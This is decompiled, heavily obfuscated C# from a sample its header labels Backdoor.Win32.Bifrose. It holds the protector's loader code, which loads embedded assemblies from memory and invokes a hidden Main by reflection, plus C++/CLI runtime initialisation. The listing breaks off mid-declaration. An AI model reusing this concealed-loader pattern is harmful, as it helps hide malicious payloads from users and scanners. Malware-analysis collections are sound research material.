// Decompiled with JetBrains decompiler
// Type: û.ú
// Assembly: KSA, Version=5.0.2.3, Culture=neutral, PublicKeyToken=null
// MVID: F5F871CB-3F0D-48DA-B587-E1D33B6A8FB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.fvn-69286638be881a065d9108adde810607b5488edeaa76ee2d59b357eb3fd86452.exe

using \u0083Ò;
using \u0083û;
using \u0083Ý;
using PvLogiciels.dotNetProtector;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Threading;

namespace \u0083û
{
  internal class \u0083ú
  {
    internal static int \u0081\u00A2;
    internal static \u0082Î \u0081\u0090;
    internal static \u0082Î \u0081\u0085;
    internal static \u0082Ä û;
    [FixedAddressValueType]
    internal static int ö;
    internal static __FnPtr<void ()> ê;
    internal static \u0082Ä Ò;
    [FixedAddressValueType]
    internal static \u0082\u00B0.\u0082\u0085 Ë;
    internal static __FnPtr<void ()> º;
    [FixedAddressValueType]
    internal static bool \u009D;
    internal static __FnPtr<void ()> \u008E;
    internal static \u0082Ä \u0083ò;
    [FixedAddressValueType]
    internal static \u0082\u00B0.\u0082\u0085 \u0083ë;
    internal static __FnPtr<void ()> \u0082Ù;
    [FixedAddressValueType]
    internal static int \u0081Å;
    internal static __FnPtr<void ()> \u0083\u00AC;
    internal static \u0082Ä \u0083\u0090;
    [FixedAddressValueType]
    internal static \u0082\u00B0.\u0082\u0085 \u0083\u008A;
    internal static __FnPtr<void ()> \u0082î;
    internal static \u0082Î \u0082Ë;
    internal static \u0082Ä \u0082À;
    [FixedAddressValueType]
    internal static \u0082\u00B0.\u0082\u0085 \u0082\u00B7;
    internal static __FnPtr<void ()> \u0082\u009A;
    internal static bool \u0082\u0081;
    internal static bool \u0095;
    internal static bool ñ;
    internal static int \u0081Ð;
    internal static uint \u0081Ä;
    internal static uint \u0083Ó;
    internal static \u0081î.\u0082\u0085 \u0081\u00A4;
    internal static uint \u0081\u0094;
    internal static uint \u0081\u0087;
    internal static uint ø;
    internal static \u0081î.\u0082\u0085 î;
    internal static bool Ý;
    internal static \u0082Ä \u0083Ð;
    internal static \u0082Î Ã;
    public static unsafe int** \u00BD;
    public static unsafe int** \u00A7;
    internal static __FnPtr<int ()> \u0092;
    internal static int \u008C;
    [FixedAddressValueType]
    internal static uint \u0084;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* \u0083ù;
    internal static uint é;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* \u0083è;
    internal static unsafe __FnPtr<void ()>* \u0083â;
    internal static unsafe __FnPtr<void ()>* \u0083Þ;
    [FixedAddressValueType]
    internal static unsafe void* \u0083\u00D7;
    [FixedAddressValueType]
    internal static int \u0083È;
    internal static int \u0083\u00BD;
    internal static int \u0083\u00B8;
    internal static int \u0083\u00B1;
    internal static int \u0082\u0093;
    internal static \u0082ª \u0083\u00AB;
    internal static volatile uint \u0083\u00A8;
    internal static \u0082ª \u0083\u00A1;
    internal static \u0082\u009D \u0083\u009F;
    internal static volatile \u0082\u0097 \u0083\u009E;
    internal static \u0082\u009D \u0082\u0080;
    internal static volatile unsafe void* \u0083\u0094;
    internal static volatile uint \u0081ú;
    internal static unsafe __FnPtr<void ()>* \u0083\u0087;
    internal static unsafe __FnPtr<void ()>* \u0081ñ;
    internal static int \u0083\u0080;

    internal static unsafe Assembly ò(string _param0)
    {
      string str = _param0.Replace("\\", "");
      if (!str.StartsWith("PvLogiciels.dotNetProtector.Runtime"))
        return (Assembly) null;
      int length = str.IndexOf(',');
      if (length >= 0)
        str = str.Substring(0, length).Trim();
      bool flag = str == "PvLogiciels.dotNetProtector.Runtime";
      byte[] numArray = !flag ? new byte[\u0083ú.\u008D()] : new byte[\u0083ú.\u0089()];
      if (numArray == null || numArray.Length == 0)
        return (Assembly) null;
      GCHandle gcHandle = GCHandle.Alloc((object) numArray, GCHandleType.Pinned);
      byte* pointer = (byte*) Marshal.UnsafeAddrOfPinnedArrayElement((Array) numArray, 0).ToPointer();
      if (flag)
        \u0083ú.\u0091(pointer);
      else
        \u0083ú.\u0096(pointer);
      gcHandle.Free();
      return Assembly.Load(numArray);
    }

    internal static unsafe void* \u00BB(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      Module module = Assembly.GetExecutingAssembly().LoadModule("embedded.netmodule", numArray);
      AppDomain.CurrentDomain.SetData("PvLogiciels.dotNetProtector.embedded.netmodule", (object) module);
      return Marshal.GetHINSTANCE(module).ToPointer();
    }

    internal static unsafe void* µ(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      return Marshal.GetHINSTANCE(Assembly.Load(numArray).GetLoadedModules()[0]).ToPointer();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int ã(string[] _param0) => \u003CdotNetProtector\u003E.Main(_param0);

    internal static int à(string[] _param0)
    {
      Module data = (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");
      if (data == (Module) null)
        return \u0083ú.ã(_param0);
      Type type = data.GetType("<dotNetProtector>");
      if (type == (Type) null)
        return \u0083ú.ã(_param0);
      MethodBase method = (MethodBase) type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
      if (method == (MethodBase) null)
        return \u0083ú.ã(_param0);
      object[] parameters = new object[1]
      {
        (object) _param0
      };
      return (int) method.Invoke((object) null, parameters);
    }

    internal static Assembly ß(object _param0, ResolveEventArgs _param1)
    {
      string str = _param1.Name.Replace("\\", "");
      if (!str.StartsWith("PvLogiciels.dotNetProtector.Runtime"))
        return (Assembly) null;
      Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
      int index = 0;
      if (0 < assemblies.Length)
      {
        Assembly assembly;
        do
        {
          assembly = assemblies[index];
          if (!(assembly.FullName == str))
            ++index;
          else
            goto label_5;
        }
        while (index < assemblies.Length);
        goto label_6;
label_5:
        return assembly;
      }
label_6:
      return (Assembly) null;
    }

    internal static Module Ú(object _param0, ResolveEventArgs _param1) => (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int Ö(string[] _param0)
    {
      PvLogiciels.dotNetProtector.Runtime.ExeInit(typeof (RuntimeInterop), IntPtr.Zero, 0);
      Assembly.GetExecutingAssembly().ModuleResolve += new ModuleResolveEventHandler(\u0083ú.Ú);
      return \u0083ú.à(_param0);
    }

    [STAThread]
    internal static int Ó(string[] _param0)
    {
      \u0083ú.\u0083\u00BB();
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0083ú.ß);
      return \u0083ú.Ö(_param0);
    }

    internal static void Ð()
    {
    }

    internal static int Í() => 0;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool Ç() => \u0083ú.\u0081ú != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0087() => \u0083ú.\u0081ú == 1U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u00B4() => \u0083ú.\u0081ú == 0U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u00A1() => \u0083ú.\u0083\u00A8 != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0083Ø() => (\u0083ú.\u0081ú != uint.MaxValue ? 1 : 0) == 0 || (\u0083ú.\u0083\u00A8 != uint.MaxValue ? 1 : 0) != 0 || \u0083ú.\u0081ú != 1U && \u0083ú.\u0081ú != 0U;

    internal static void \u0083É(Exception _param0, Exception _param1) => throw new \u0083Ç("A nested exception occurred after the primary exception that caused the C++ module to fail to load.\n", _param0, _param1);

    internal static void \u0083ï(string _param0) => throw new \u0083Ì(_param0);

    internal static void \u0083ï(string _param0, Exception _param1) => throw new \u0083Ì(_param0, _param1);

    internal static void \u0083à(EventHandler _param0) => \u0083À.\u0083ó.\u0083(_param0);

    [SecuritySafeCritical]
    internal static unsafe Guid \u0083\u0089(\u0082ë* _param0) => new Guid((uint) *(int*) _param0, *(ushort*) ((IntPtr) _param0 + 4), *(ushort*) ((IntPtr) _param0 + 6), *(byte*) ((IntPtr) _param0 + 8), *(byte*) ((IntPtr) _param0 + 9), *(byte*) ((IntPtr) _param0 + 10), *(byte*) ((IntPtr) _param0 + 11), *(byte*) ((IntPtr) _param0 + 12), *(byte*) ((IntPtr) _param0 + 13), *(byte*) ((IntPtr) _param0 + 14), *(byte*) ((IntPtr) _param0 + 15));

    [SecurityCritical]
    internal static unsafe int \u0083Ä(\u0082\u008C** _param0)
    {
      \u0081ò* òPtr1 = (\u0081ò*) 0;
      int num1;
      try
      {
        Guid riid = \u0083ú.\u0083\u0089((\u0082ë*) &\u0083ú.\u0081\u0085);
        òPtr1 = (\u0081ò*) RuntimeEnvironment.GetRuntimeInterfaceAsIntPtr(\u0083ú.\u0083\u0089((\u0082ë*) &\u0083ú.\u0082Ë), riid).ToPointer();
        goto label_4;
      }
      catch (Exception ex)
      {
        num1 = Marshal.GetHRForException(ex);
      }
      if (num1 < 0)
        goto label_5;
label_4:
      \u0081ò* òPtr2 = òPtr1;
      \u0082\u008C** objPtr = _param0;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      num1 = __calli((__FnPtr<int (IntPtr, \u0082\u008C**)>) *(int*) (*(int*) òPtr1 + 52))((\u0082\u008C**) òPtr2, (IntPtr) objPtr);
      \u0081ò* òPtr3 = òPtr1;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      int num2 = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) òPtr3 + 8))((IntPtr) òPtr3);
label_5:
      return num1;
    }

    internal static unsafe void \u0082\u009F(\u0082\u008C* _param0)
    {
      \u0082\u008C* objPtr = _param0;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      int num = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) objPtr + 8))((IntPtr) objPtr);
    }

    [SecurityCritical]
    internal static unsafe AppDomain \u0083º()
    {
      \u0082\u008C* objPtr1 = (\u0082\u008C*) 0;
      int errorCode = \u0083ú.\u0083Ä(&objPtr1);
      if (errorCode >= 0)
      {
        try
        {
          return (AppDomain) Marshal.GetObjectForIUnknown(new IntPtr((void*) objPtr1));
        }
        finally
        {
          \u0082\u008C* objPtr2 = objPtr1;
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          int num = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) objPtr2 + 8))((IntPtr) objPtr2);
        }
      }
      else
      {
        Marshal.ThrowExceptionForHR(errorCode);
        return (AppDomain) null;
      }
    }

    [SecurityCritical]
    internal static unsafe void \u0083\u00A9(__FnPtr<int (void*)> _param0, void* _param1)
    {
      Guid riid = \u0083ú.\u0083\u0089((\u0082ë*) &\u0083ú.Ã);
      \u0081ë* pointer = (\u0081ë*) RuntimeEnvironment.GetRuntimeInterfaceAsIntPtr(\u0083ú.\u0083\u0089((\u0082ë*) &\u0083ú.\u0081\u0090), riid).ToPointer();
      try
      {
        AppDomain appDomain = \u0083ú.\u0083º();
        // ISSUE: cast to a function pointer type
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        int errorCode = __calli((__FnPtr<int (IntPtr, uint, __FnPtr<int (void*)>, void*)>) *(int*) (*(int*) pointer + 32))((void*) pointer, (__FnPtr<int (void*)>) appDomain.Id, (uint) _param0, (IntPtr) _param1);
        if (errorCode >= 0)
          return;
        Marshal.ThrowExceptionForHR(errorCode);
      }
      finally
      {
        \u0081ë* ëPtr = pointer;
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        int num = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) ëPtr + 8))((IntPtr) ëPtr);
      }
    }

    [SecuritySafeCritical]
    internal static unsafe int \u0083\u0095(void* _param0)
    {
      GC.KeepAlive((object) int.MaxValue);
      return 0;
    }

    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0083\u0086()
    {
      if (\u0083ú.î != (\u0081î.\u0082\u0085) 2)
        return \u0083ú.î == (\u0081î.\u0082\u0085) -1;
      void** voidPtr = (void**) &\u0083ú.\u0083Ð;
      if (ref \u0083ú.\u0083Ð < ref \u0083ú.û)
      {
        while (*(int*) voidPtr == 0)
        {
          voidPtr += 4;
          if ((IntPtr) voidPtr >= ref \u0083ú.û)
            goto label_5;
        }
        \u0083ú.î = (\u0081î.\u0082\u0085) -1;
        return true;
      }
label_5:
      \u0083ú.î = (\u0081î.\u0082\u0085) 0;
      return false;
    }

    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0082\u00F7()
    {
      if (\u0083ú.\u0081\u00A4 != (\u0081î.\u0082\u0085) 2)
        return \u0083ú.\u0081\u00A4 == (\u0081î.\u0082\u0085) -1;
      void** voidPtr1 = (void**) &\u0083ú.\u0083\u009F;
      if (ref \u0083ú.\u0083\u009F < ref \u0083ú.\u0082\u0080)
      {
        while (*(int*) voidPtr1 == 0)
        {
          voidPtr1 += 4;
          if ((IntPtr) voidPtr1 >= ref \u0083ú.\u0082\u0080)
            goto label_5;
        }
        \u0083ú.\u0081\u00A4 = (\u0081î.\u0082\u0085) -1;
        return true;
      }
label_5:
      void** voidPtr2 = (void**) &\u0083ú.\u0083\u00A1;
      if (ref \u0083ú.\u0083\u00A1 < ref \u0083ú.\u0083\u00AB)
      {
        while (*(int*) voidPtr2 == 0)
        {
          voidPtr2 += 4;
          if ((IntPtr) voidPtr2 >= ref \u0083ú.\u0083\u00AB)
            goto label_9;
        }
        \u0083ú.\u0081\u00A4 = (\u0081î.\u0082\u0085) -1;
        return true;
      }
label_9:
      \u0083ú.\u0081\u00A4 = (\u0081î.\u0082\u0085) 0;
      return false;
    }

    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0082\u0092() => \u0083ú.\u0083\u0086() && !\u0083ú.\u0082\u0081 || \u0083ú.\u0082\u00F7() && !\u0083ú.ñ && \u0083ú.\u0083\u009E == (\u0082\u0097) 0;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0082Ð() => \u0083ú.\u0095;

    [SecurityCritical]
    internal static unsafe void \u0081õ() => \u0083ú.\u0083\u00A9((__FnPtr<int (void*)>) (IntPtr) \u0083ú.\u00BD, (void*) 0);

    internal static void \u0082\u00A9() => \u0083ú.\u0081Å = 0;

    internal static void \u0081Î() => \u0083ú.ö = 0;

    internal static void \u0081ü() => \u0083ú.\u009D = false;

    internal static void \u0081æ() => \u0083ú.\u0083\u008A = (\u0082\u00B0.\u0082\u0085) 0;

    internal static void \u0081É() => \u0083ú.\u0083ë = (\u0082\u00B0.\u0082\u0085) 0;

    internal static void \u0081ª() => \u0083ú.\u0082\u00B7 = (\u0082\u00B0.\u0082\u0085) 0;

    internal static void \u0081\u008F() => \u0083ú.Ë = (\u0082\u00B0.\u0082\u0085) 0;

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0083å([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u0082ñ((\u0082\u00D7*) obj0, "The C++ module failed to load during vtable initialization.\n");
      \u0083ú.\u0083\u008A = (\u0082\u00B0.\u0082\u0085) 1;
      \u0083ú.Ê((__FnPtr<void* ()>*) &\u0083ú.Ò, (__FnPtr<void* ()>*) &\u0083ú.\u0082À);
      \u0083ú.\u0083\u008A = (\u0082\u00B0.\u0082\u0085) 2;
    }

    [SecurityCritical]
    internal static unsafe void è([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u0082ñ((\u0082\u00D7*) obj0, "The C++ module failed to load while attempting to initialize the default appdomain.\n");
      \u0083ú.\u0081õ();
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void Ø([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u0082ñ((\u0082\u00D7*) obj0, "The C++ module failed to load during native initialization.\n");
      \u0083ú.\u0081á();
      \u0083ú.ñ = true;
      if (!\u0083ú.\u0083Ø())
        \u0083ú.\u0024(33);
      switch (\u0083ú.\u0083\u009E)
      {
        case (\u0082\u0097) 0:
          \u0083ú.\u0083ë = (\u0082\u00B0.\u0082\u0085) 1;
          \u0083ú.\u0083\u009E = (\u0082\u0097) 1;
          if (\u0083ú.á((__FnPtr<int ()>*) &\u0083ú.\u0083\u009F, (__FnPtr<int ()>*) &\u0083ú.\u0082\u0080) != 0)
            throw new \u0083Ì(\u0083ú.\u0082ç((\u0082\u00D7*) obj0));
          \u0083ú.Û((__FnPtr<void ()>*) &\u0083ú.\u0083\u00A1, (__FnPtr<void ()>*) &\u0083ú.\u0083\u00AB);
          \u0083ú.\u0083\u009E = (\u0082\u0097) 2;
          \u0083ú.Ý = true;
          \u0083ú.\u0083ë = (\u0082\u00B0.\u0082\u0085) 2;
          break;
        case (\u0082\u0097) 1:
          \u0083ú.\u0024(33);
          break;
      }
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void Æ([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u0082ñ((\u0082\u00D7*) obj0, "The C++ module failed to load during process initialization.\n");
      \u0083ú.\u0082\u00B7 = (\u0082\u00B0.\u0082\u0085) 1;
      \u0083ú.\u0081\u0086();
      \u0083ú.Ê((__FnPtr<void* ()>*) &\u0083ú.\u0083Ð, (__FnPtr<void* ()>*) &\u0083ú.û);
      \u0083ú.\u0082\u00B7 = (\u0082\u00B0.\u0082\u0085) 2;
      \u0083ú.\u0082\u0081 = true;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u00BC([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u0082ñ((\u0082\u00D7*) obj0, "The C++ module failed to load during appdomain initialization.\n");
      \u0083ú.Ë = (\u0082\u00B0.\u0082\u0085) 1;
      \u0083ú.\u00AC();
      \u0083ú.Ê((__FnPtr<void* ()>*) &\u0083ú.\u0083ò, (__FnPtr<void* ()>*) &\u0083ú.\u0083\u0090);
      \u0083ú.Ë = (\u0082\u00B0.\u0082\u0085) 2;
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0083Û([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u0082ñ((\u0082\u00D7*) obj0, "The C++ module failed to load during registration for the unload events.\n");
      EventHandler eventHandler = new EventHandler(\u0083ú.\u0082þ);
      \u0083À.\u0083ó.\u0083(eventHandler);
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0098([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u009D = AppDomain.CurrentDomain.IsDefaultAppDomain();
      if (\u0083ú.\u009D)
        \u0083ú.\u0095 = true;
      void* voidPtr1 = \u0083ú.\u0081ç();
      int num1 = 0;
      int num2 = 0;
      int num3 = 0;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        while (num2 == 0)
        {
          try
          {
          }
          finally
          {
            IntPtr comparand = (IntPtr) 0;
            IntPtr num4 = (IntPtr) voidPtr1;
            // ISSUE: cast to a reference type
            void* voidPtr2 = (void*) Interlocked.CompareExchange((IntPtr&) ref \u0083ú.\u0083\u0094, num4, comparand);
            if ((IntPtr) voidPtr2 == IntPtr.Zero)
              num2 = 1;
            else if (voidPtr2 == voidPtr1)
            {
              num1 = 1;
              num2 = 1;
            }
          }
          if (num2 == 0)
            \u0083ú.\u0081Ù(1000U);
        }
        \u0083ú.\u0083å(obj0);
        if (\u0083ú.\u009D)
        {
          \u0083ú.Ø(obj0);
          \u0083ú.Æ(obj0);
        }
        else if (\u0083ú.\u0082\u0092())
          num3 = 1;
      }
      finally
      {
        if (num1 == 0)
        {
          IntPtr num5 = (IntPtr) 0;
          // ISSUE: cast to a reference type
          Interlocked.Exchange((IntPtr&) ref \u0083ú.\u0083\u0094, num5);
        }
      }
      if (num3 != 0)
        \u0083ú.è(obj0);
      \u0083ú.\u00BC(obj0);
      \u0083ú.\u0081Å = 1;
      \u0083ú.\u0083Û(obj0);
    }

    [SecurityCritical]
    internal static void \u008B() => \u0083ú.\u00A4();

    [SecurityCritical]
    internal static unsafe int \u0083ø(void* _param0)
    {
      \u0083ú.\u0081\u008A();
      \u0083ú.\u0082\u0081 = false;
      if (\u0083ú.Ý)
      {
        \u0083ú.\u0083\u00B2();
        \u0083ú.\u0083\u009E = (\u0082\u0097) 0;
        \u0083ú.Ý = false;
      }
      \u0083ú.ñ = false;
      return 0;
    }

    [SecurityCritical]
    internal static unsafe void \u0083ã()
    {
      if (!\u0083ú.\u0095)
        return;
      if (AppDomain.CurrentDomain.IsDefaultAppDomain())
      {
        \u0083ú.\u0083ø((void*) 0);
      }
      else
      {
        // ISSUE: cast to a function pointer type
        \u0083ú.\u0083\u00A9((__FnPtr<int (void*)>) (IntPtr) \u0083ú.\u00A7, (void*) 0);
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [PrePrepareMethod]
    [SecurityCritical]
    internal static void \u0082þ(object _param0, EventArgs _param1)
    {
      if (\u0083ú.\u0081Å == 0 || Interlocked.Exchange(ref \u0083ú.ö, 1) != 0)
        return;
      int num = Interlocked.Decrement(ref \u0083ú.\u0081Ð) == 0 ? 1 : 0;
      \u0083ú.\u00A4();
      if ((byte) num == (byte) 0)
        return;
      \u0083ú.\u0083ã();
    }

    [DebuggerStepThrough]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    internal static unsafe void \u0082æ([In] \u0082\u0089* obj0, Exception _param1)
    {
      try
      {
        bool flag = Interlocked.Decrement(ref \u0083ú.\u0081Ð) == 0;
        \u0083ú.\u008B();
        if (!flag)
          return;
        \u0083ú.\u0083ã();
      }
      catch (Exception ex)
      {
        \u0083ú.\u0083É(_param1, ex);
      }
      catch
      {
        \u0083ú.\u0083É(_param1, (Exception) null);
      }
    }

    [SecurityCritical]
    internal static unsafe \u0082\u0089* \u0083\u00B4([In] \u0082\u0089* obj0)
    {
      \u0083ú.\u0083\u0084((\u0082\u00D7*) obj0);
      return obj0;
    }

    [SecurityCritical]
    internal static unsafe void \u0083\u00A5([In] \u0082\u0089* obj0) => \u0083ú.\u0082û((\u0082\u00D7*) obj0);

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0081à([In] \u0082\u0089* obj0)
    {
      bool flag = false;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        \u0083ú.\u0082ñ((\u0082\u00D7*) obj0, "The C++ module failed to load.\n");
        RuntimeHelpers.PrepareConstrainedRegions();
        try
        {
        }
        finally
        {
          Interlocked.Increment(ref \u0083ú.\u0081Ð);
          flag = true;
        }
        \u0083ú.\u0098(obj0);
      }
      catch (Exception ex)
      {
        if (flag)
          \u0083ú.\u0082æ(obj0, ex);
        throw new \u0083Ì(\u0083ú.\u0082ç((\u0082\u00D7*) obj0), ex);
      }
      catch
      {
        if (flag)
          \u0083ú.\u0082æ(obj0, (Exception) null);
        throw new \u0083Ì(\u0083ú.\u0082ç((\u0082\u00D7*) obj0), (Exception) null);
      }
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    static unsafe \u0083ú()
    {
      \u0082\u0089 obj;
      \u0083ú.\u0083\u00B4(&obj);
      // ISSUE: fault handler
      try
      {
        \u0083ú.\u0081à(&obj);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u0083ú.\u00B7((__FnPtr<void (void*)>) __methodptr(\u0083\u00A5), (void*) &obj);
      }
      \u0083ú.\u0082û((\u0082\u00D7*) &obj);
    }

    [SecuritySafeCritical]
    [DebuggerStepThrough]
    internal static unsafe \u0082\u00D7* \u0083\u0084([In] \u0082\u00D7* obj0)
    {
      IntPtr num = (IntPtr) GCHandle.Alloc((object) null);
      *(int*) obj0 = (int) num.ToPointer();
      return obj0;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0082û([In] \u0082\u00D7* obj0)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Free();
      *(int*) obj0 = 0;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe \u0082\u00D7* \u0082ñ([In] \u0082\u00D7* obj0, string _param1)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target = (object) _param1;
      return obj0;
    }

    [SecuritySafeCritical]
    internal static unsafe string \u0082ç([In] \u0082\u00D7* obj0) => (string) ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target;

    [HandleProcessCorruptedStateExceptions]
    [STAThread]
    internal static unsafe int \u0082Ö(string[] _param0)
    {
      if (\u0083ú.\u008C == 0)
        \u0083ú.\u0081Ê((void*) 0, (\u0082\u0082) 1, (void*) 0, 0U);
      try
      {
        \u0083ú.\u0099();
        \u0081\u00B7 obj;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref obj = \u0083ú.\u0081\u00B6();
        int num;
        char** chPtr1;
        char** chPtr2;
        if (\u0083ú.Õ(&num, &chPtr1, &chPtr2, \u0083ú.\u0083\u00BD, &obj) < 0)
          \u0083ú.\u0024(8);
        return \u0083ú.Ó(_param0);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00BD((uint) Marshal.GetExceptionCode(), (\u0081\u00BC*) Marshal.GetExceptionPointers()) != 0)
      {
        return Marshal.GetExceptionCode();
      }
    }

    internal static unsafe void \u0082Ï()
    {
      ù* ùPtr = (ù*) \u0083ú.\u0081\u00AC((char*) 0);
      if (*(ushort*) ùPtr != (ushort) 23117)
        return;
      \u0081\u009A* objPtr = (\u0081\u009A*) (*(int*) ((IntPtr) ùPtr + 60) + (IntPtr) ùPtr);
      if (*(int*) objPtr != 17744 || *(ushort*) ((IntPtr) objPtr + 24) != (ushort) 267)
        return;
      if (*(ushort*) ((IntPtr) objPtr + 24 + 68) != (ushort) 3)
        \u0083ú.\u0081Í(2);
      else
        \u0083ú.\u0081Í(1);
    }

    [SecurityCritical]
    internal static unsafe void \u0082Ã()
    {
      \u0083ú.\u0082Ï();
      *\u0083ú.\u0081º() = \u0083ú.\u0082\u0093;
      *\u0083ú.\u0081\u00BF() = \u0083ú.\u0083\u00B1;
      if (\u0083ú.\u0083\u00B8 != -1)
        return;
      \u0083ú.\u0081Ç(-1);
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe ValueType \u0082\u00BC() => (IntPtr) \u0083ú.\u0083\u00D7 != IntPtr.Zero ? (ValueType) GCHandle.FromIntPtr(new IntPtr(\u0083ú.\u0083\u00D7)) : (ValueType) null;

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0081\u00D7(object _param0)
    {
      \u0083ú.\u0083\u00D7 = (void*) 0;
      \u0083ú.\u0082\u0099(_param0);
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0082\u0099(object _param0)
    {
      ValueType valueType = \u0083ú.\u0082\u00BC();
      if (valueType == null)
        \u0083ú.\u0083\u00D7 = GCHandle.ToIntPtr(GCHandle.Alloc(_param0)).ToPointer();
      else
        ((GCHandle) valueType).Target = _param0;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static object \u0082\u008B()
    {
      ValueType valueType = \u0083ú.\u0082\u00BC();
      return valueType != null ? ((GCHandle) valueType).Target : (object) null;
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0082\u0083()
    {
      ValueType valueType = \u0083ú.\u0082\u00BC();
      if (valueType == null)
        return;
      ((GCHandle) valueType).Free();
      \u0083ú.\u0083\u00D7 = (void*) 0;
    }

    [DebuggerStepThrough]
    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081\u00F7() => \u0083ú.\u0082\u008B() != null;

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0081é()
    {
      if (!\u0083ú.\u0081\u00F7())
      {
        \u0083ú.\u0083\u00D7 = (void*) 0;
        \u0083ú.\u0082\u0099(new object());
        \u0083ú.\u0083È = 0;
      }
      ++\u0083ú.\u0083È;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081Ü()
    {
      --\u0083ú.\u0083È;
      if (\u0083ú.\u0083È != 0)
        return;
      \u0083ú.\u0082\u0083();
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081Ï() => Monitor.Enter(\u0083ú.\u0082\u008B());

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081Æ() => Monitor.Exit(\u0083ú.\u0082\u008B());

    [SecurityCritical]
    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool ë()
    {
      bool flag = false;
      if (\u0083ú.\u0081\u00F7())
      {
        Monitor.Enter(\u0083ú.\u0082\u008B());
        flag = true;
      }
      return flag;
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081\u00B1()
    {
      bool flag = false;
      if (\u0083ú.\u0081\u00F7())
      {
        Monitor.Exit(\u0083ú.\u0082\u008B());
        flag = true;
      }
      return flag;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
